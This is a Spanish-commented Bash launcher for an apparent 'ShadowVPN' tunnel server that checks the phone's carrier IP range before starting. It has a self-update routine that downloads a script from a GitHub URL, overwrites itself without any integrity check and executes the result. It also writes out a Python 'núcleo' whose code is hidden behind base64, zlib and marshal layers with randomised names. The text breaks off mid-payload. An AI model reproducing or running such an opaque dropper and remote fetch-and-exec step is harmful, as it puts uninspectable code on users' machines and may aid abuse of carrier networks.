#!/bin/bash

# ==========================================
# SHADOW OPERATOR LAUNCHER | VPN SDC SERVER
# ==========================================

SCRIPT_TARGET="vpn_local_server_sdc.py"
PORT=8080
IP_RANGE_MIN=20
IP_RANGE_MAX=90
SCRIPT_VERSION="3.8"
UPDATE_URL="https://raw.githubusercontent.com/Pr3da7ol/ShadowVPN/main/start_vpn.bash"
export DEBIAN_FRONTEND=noninteractive

# Colores
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_msg() { echo -e "${2}[${1}] ${3}${NC}"; }

# --- AUTO-UPDATE ---
get_self_path() {
    local p="$0"
    local resolved=""
    if command -v readlink &> /dev/null; then
        resolved="$(readlink -f "$p" 2>/dev/null)"
    fi
    if [ -z "$resolved" ] && command -v realpath &> /dev/null; then
        resolved="$(realpath "$p" 2>/dev/null)"
    fi
    [ -n "$resolved" ] && echo "$resolved" || echo "$p"
}

fetch_remote_script() {
    local url="$1"
    local out="$2"
    if command -v curl &> /dev/null; then
        curl -fsSL "$url" -o "$out"
    elif command -v wget &> /dev/null; then
        wget -qO "$out" "$url"
    else
        return 1
    fi
}

extract_version() {
    local file="$1"
    local v=""
    v="$(grep -m1 '^SCRIPT_VERSION=' "$file" 2>/dev/null | cut -d'"' -f2)"
    if [ -z "$v" ]; then
        v="$(grep -m1 -E 'REPARACIÓN DE EMERGENCIA \(V[0-9.]+\)' "$file" 2>/dev/null | sed -E 's/.*\(V([0-9.]+)\).*/\1/')"
    fi
    echo "$v"
}

auto_update() {
    local self_path tmp_file remote_version
    self_path="$(get_self_path)"
    tmp_file="/tmp/start_vpn.bash.$$"

    if ! fetch_remote_script "$UPDATE_URL" "$tmp_file"; then
        echo -e "${AMARILLO}[!] Auto-update no disponible (curl/wget o red).${NC}"
        return 0
    fi

    remote_version="$(extract_version "$tmp_file")"
    if [ -z "$remote_version" ]; then
        echo -e "${AMARILLO}[!] No se pudo leer version remota. Omitiendo update.${NC}"
        rm -f "$tmp_file"
        return 0
    fi

    if [ "$remote_version" != "$SCRIPT_VERSION" ]; then
        echo -e "${CYAN}[*] Update detectado: v${SCRIPT_VERSION} -> v${remote_version}${NC}"
        if cp "$tmp_file" "$self_path" 2>/dev/null; then
            chmod +x "$self_path" 2>/dev/null
            echo -e "${VERDE}[OK] Script actualizado. Re-lanzando...${NC}"
            rm -f "$tmp_file"
            exec "$self_path" "$@"
        else
            echo -e "${ROJO}[X] No se pudo escribir en: $self_path${NC}"
            rm -f "$tmp_file"
            return 0
        fi
    else
        echo -e "${VERDE}[OK] Script en ultima version (v${SCRIPT_VERSION}).${NC}"
        rm -f "$tmp_file"
        return 0
    fi
}

# --- VERIFICACIÓN DE RANGO IP (IFCONFIG) ---
get_ifconfig_ips() {
    ifconfig 2>/dev/null \
        | grep -Eo 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' \
        | awk '{print $2}' \
        | sed 's/^addr://g' \
        | sort -u
}

get_rmnet0_ip() {
    local ip=""
    ip="$(ifconfig rmnet0 2>/dev/null \
        | grep -Eo 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' \
        | awk '{print $2}' \
        | sed 's/^addr://g' \
        | head -n1)"
    if [ -n "$ip" ]; then
        echo "$ip"
        return 0
    fi
    ifconfig 2>/dev/null | awk '
        $1 ~ /^rmnet0/ {show=1; next}
        show && $1 ~ /^$/ {exit}
        show && $1=="inet" {print $2; exit}
    ' | sed 's/^addr://g'
}

ip_in_recommended_range() {
    local ip="$1"
    local o1 o2 o3 o4
    IFS='.' read -r o1 o2 o3 o4 <<< "$ip"
    [ "$o1" = "10" ] || return 1
    case "$o2" in
        ''|*[!0-9]*) return 1 ;;
    esac
    [ "$o2" -ge "$IP_RANGE_MIN" ] && [ "$o2" -le "$IP_RANGE_MAX" ]
}

check_ip_range_ifconfig() {
    if ! command -v ifconfig &> /dev/null; then
        echo -e "${AMARILLO}[!] ifconfig no disponible. Omitiendo verificacion de rango.${NC}"
        return 0
    fi

    local rmnet_ip current_ip ok match_ip
    rmnet_ip="$(get_rmnet0_ip)"
    ok=1

    if [ -n "$rmnet_ip" ]; then
        current_ip="$rmnet_ip"
        if ip_in_recommended_range "$rmnet_ip"; then
            ok=0
            match_ip="$rmnet_ip"
        fi
    else
        local ips primary_ip
        ips="$(get_ifconfig_ips)"
        if [ -z "$ips" ]; then
            echo -e "${AMARILLO}[!] No se detectaron IPs con ifconfig. Omitiendo verificacion.${NC}"
            return 0
        fi
        primary_ip=""
        for ip in $ips; do
            if [ "$ip" != "127.0.0.1" ]; then
                primary_ip="$ip"
                break
            fi
        done
        if [ -z "$primary_ip" ]; then
            primary_ip="$(echo "$ips" | head -n1)"
        fi
        current_ip="$primary_ip"
        if [ -n "$primary_ip" ] && ip_in_recommended_range "$primary_ip"; then
            ok=0
            match_ip="$primary_ip"
        fi
    fi

    if [ "$ok" -eq 0 ]; then
        echo -e "${VERDE}[OK] IP EN RANGO SUGERIDO: ${NC}$match_ip"
        echo -e "${CYAN}Rango sugerido: 10.${IP_RANGE_MIN} - 10.${IP_RANGE_MAX}${NC}"
        return 0
    fi

    if [ -z "$current_ip" ]; then
        current_ip="N/A"
    fi
    echo -e "${ROJO}[X] IP FUERA DE RANGO SUGERIDO: ${NC}$current_ip"
    echo -e "${CYAN}Rango sugerido: 10.${IP_RANGE_MIN} - 10.${IP_RANGE_MAX}${NC}"
    echo -e "${CYAN}[*] PROTOCOLO DE RECUPERACION DE RANGO:${NC}"
    echo -e "${CYAN}    1) PON EL TELEFONO EN MODO AVION (10-15s).${NC}"
    echo -e "${CYAN}    2) DESACTIVA MODO AVION Y ESPERA NUEVA IP.${NC}"
    echo -e "${CYAN}    3) VERIFICA CON ifconfig Y REINTENTA.${NC}"
    echo -e "${AMARILLO}[!] Continuar podria afectar rendimiento o consumo de datos.${NC}"
    read -r -p ">> Forzar ejecucion? (s/N): " confirm
    if [ "$confirm" != "s" ]; then
        echo -e "${ROJO}[!] Operacion abortada por verificacion de rango.${NC}"
        exit 0
    fi
    echo -e "${AMARILLO}[!] MODO FORZADO ACTIVADO.${NC}"
}

# --- CONTROL DE PUERTO ---
port_in_use() {
    if command -v ss &> /dev/null; then
        ss -ltn "sport = :$PORT" 2>/dev/null | grep -q ":$PORT"
    elif command -v lsof &> /dev/null; then
        lsof -iTCP:"$PORT" -sTCP:LISTEN -t &> /dev/null
    elif command -v fuser &> /dev/null; then
        fuser -n tcp "$PORT" &> /dev/null
    else
        return 1
    fi
}

kill_port() {
    local pids=""
    if command -v ss &> /dev/null; then
        pids=$(ss -ltnp "sport = :$PORT" 2>/dev/null | awk -F'pid=' 'NR>1{split($2,a,","); print a[1]}' | sort -u)
    elif command -v lsof &> /dev/null; then
        pids=$(lsof -iTCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null | sort -u)
    elif command -v fuser &> /dev/null; then
        pids=$(fuser -n tcp "$PORT" 2>/dev/null)
    fi
    if [ -n "$pids" ]; then
        log_msg "WARN" "$AMARILLO" "Puerto $PORT en uso. Cerrando PID(s): $pids"
        kill $pids 2>/dev/null
        sleep 1
        if port_in_use; then
            log_msg "WARN" "$ROJO" "Forzando cierre en puerto $PORT"
            kill -9 $pids 2>/dev/null
        fi
    fi
}

# --- 1. GENERACIÓN DEL PAYLOAD (Self-Extracting) ---
generate_payload() {
    log_msg "SYSTEM" "$CYAN" "Verificando integridad del núcleo..."
    if [ -f "$SCRIPT_TARGET" ]; then
        log_msg "CHECK" "$VERDE" "Núcleo $SCRIPT_TARGET detectado localmente."
    else
        log_msg "GEN" "$AMARILLO" "Núcleo no detectado. Materializando $SCRIPT_TARGET (ULTRA SECURE)..."
        
        # INICIO DEL BLOQUE PYTHON PROTEGIDO V2
        cat << 'EOF' > "$SCRIPT_TARGET"
# SHADOW PROTECTED | DO NOT MODIFY
import zlib as uspHoJ, base64 as WNOUKa, marshal as XtEnCD
mzsXSf = 55
BmIDIY = WNOUKa.b64decode('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